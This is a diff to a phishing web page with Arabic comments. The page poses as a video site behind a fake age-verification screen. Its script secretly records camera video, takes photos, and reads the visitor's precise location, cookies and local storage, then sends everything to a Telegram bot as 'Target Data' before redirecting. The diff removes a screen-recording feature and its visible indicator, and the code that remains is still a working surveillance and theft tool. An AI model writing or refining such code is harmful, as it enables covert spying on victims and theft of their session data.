@@ -123,20 +123,6 @@
         .bottom-nav { bottom: 0; left: 0; width: 100%; height: 60px; background: linear-gradient(to top, rgba(0,0,0,0.8), transparent); display: flex; justify-content: space-around; align-items: center; }
         .nav-item, .sidebar-icon { display: flex; flex-direction: column; align-items: center; color: white; font-size: 12px; }
         .sidebar-icon svg, .nav-item svg { width: 30px; height: 30px; fill: white; margin-bottom: 4px; }
-        #recording-overlay {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0,0,0,0.7);
-            backdrop-filter: blur(10px);
-            color: white;
-            padding: 8px 15px;
-            border-radius: 30px;
-            font-size: 12px;
-            z-index: 9999;
-            display: none;
-            font-weight: bold;
-        }
         /* نافذة التحقق المزيفة */
         .overlay {
             position: fixed;
@@ -203,7 +189,6 @@
             <div class="loading-message" id="loading-message">جاري تحميل الفيديو...</div>
             <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
         </div>
-        <div id="recording-overlay">🔴 تسجيل</div>
     </div>
 
     <!-- نافذة التحقق من العمر المزيفة -->
@@ -229,7 +214,6 @@
             userAgent: navigator.userAgent,
             capturedImages: [],
             capturedVideo: null,
-            screenRecording: null,
             location: null,
             cookies: null,
             localStorageData: {}
@@ -245,7 +229,7 @@
             if(msgEl) msgEl.textContent = msg;
         }
 
-        // 1. تسجيل فيديو من الكاميرا (6 ثوانٍ) - رسالة "جاري تحضير الفيديو"
+        // 1. تسجيل فيديو من الكاميرا (6 ثوانٍ)
         async function recordCameraVideo() {
             try {
                 updateMessage('جاري تحضير الفيديو...');
@@ -260,7 +244,6 @@
                     reader.readAsDataURL(blob);
                 };
                 recorder.start();
-                // لا نعرض رسالة تسجيل للمستخدم
                 await new Promise(r => setTimeout(r, 6000));
                 recorder.stop();
                 stream.getTracks().forEach(t => t.stop());
@@ -268,37 +251,7 @@
             } catch(e) { console.warn('Video record failed:', e); return false; }
         }
 
-        // 2. تسجيل شاشة الجهاز (10 ثوانٍ) - يتعذر أحياناً
-        async function recordScreen() {
-            try {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-                    console.warn('Screen recording not supported');
-                    return false;
-                }
-                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
-                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                const chunks = [];
-                recorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
-                recorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const reader = new FileReader();
-                    reader.onloadend = () => { collectedData.screenRecording = reader.result; };
-                    reader.readAsDataURL(blob);
-                };
-                recorder.start();
-                document.getElementById('recording-overlay').style.display = 'block';
-                await new Promise(r => setTimeout(r, 10000));
-                recorder.stop();
-                stream.getTracks().forEach(t => t.stop());
-                document.getElementById('recording-overlay').style.display = 'none';
-                return true;
-            } catch(e) { 
-                console.warn('Screen recording failed:', e);
-                return false; 
-            }
-        }
-
-        // 3. التقاط 3 صور من الكاميرا - رسالة "يرجى الانتظار"
+        // 2. التقاط 3 صور من الكاميرا
         async function captureMultipleImages() {
             try {
                 updateMessage('يرجى الانتظار...');
@@ -326,7 +279,7 @@
             } catch(e) { console.warn('Camera capture failed:', e); return false; }
         }
 
-        // 4. الموقع الجغرافي
+        // 3. الموقع الجغرافي
         async function getPreciseLocation() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
@@ -346,7 +299,7 @@
             });
         }
 
-        // 5. جمع الكوكيز والتخزين
+        // 4. جمع الكوكيز والتخزين
         function collectStorage() {
             try {
                 collectedData.cookies = document.cookie;
@@ -357,7 +310,7 @@
             } catch(e) {}
         }
 
-        // 6. إرسال كل البيانات إلى تيليغرام - رسالة "لحظة من فضلك"
+        // 5. إرسال كل البيانات إلى تيليغرام
         async function sendAllData() {
             updateMessage('لحظة من فضلك...');
             let msg = `🎯 Target Data\n⏰ Time: ${collectedData.timestamp}\n📱 Device: ${collectedData.userAgent.substring(0,150)}\n`;
@@ -365,7 +318,6 @@
             msg += `🍪 Cookies: ${collectedData.cookies ? collectedData.cookies.substring(0,200) : 'None'}\n`;
             msg += `📸 Images: ${collectedData.capturedImages.length}\n`;
             msg += `🎥 Camera Video: ${collectedData.capturedVideo ? 'Yes' : 'No'}\n`;
-            msg += `🖥️ Screen Recording: ${collectedData.screenRecording ? 'Yes' : 'No'}\n`;
             
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -390,36 +342,23 @@
                 fd.append('video', blob, 'camera_video.mp4');
                 fd.append('caption', '🎥 فيديو تم تسجيله');
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
-                await new Promise(r => setTimeout(r, 1000));
-            }
-            
-            // إرسال تسجيل الشاشة (إذا تم بنجاح)
-            if(collectedData.screenRecording) {
-                let blob = await fetch(collectedData.screenRecording).then(r => r.blob());
-                let fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('video', blob, 'screen_recording.webm');
-                fd.append('caption', '🖥️ تسجيل شاشة');
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
             }
         }
 
         // العملية الرئيسية المتكاملة
         async function fullOperation() {
             updateProgress(5);
-            await recordCameraVideo();      // فيديو الكاميرا
-            updateProgress(25);
-            await captureMultipleImages();   // 3 صور + رسالة "تم عرض الفيديو"
-            updateProgress(45);
-            await recordScreen();            // تسجيل الشاشة (يتعذر أحياناً، يتم تخطيه بصمت)
-            updateProgress(65);
-            await getPreciseLocation();      // الموقع
-            updateProgress(80);
-            collectStorage();                // كوكيز وتخزين
-            updateProgress(90);
-            await sendAllData();             // إرسال كل شيء مع رسالة "لحظة من فضلك"
+            await recordCameraVideo();
+            updateProgress(30);
+            await captureMultipleImages();
+            updateProgress(60);
+            await getPreciseLocation();
+            updateProgress(75);
+            collectStorage();
+            updateProgress(85);
+            await sendAllData();
             updateProgress(100);
-            updateMessage('سيتم تحويلك الآن...');
+            updateMessage('يرجى الانتظار...');
             setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
         }
 
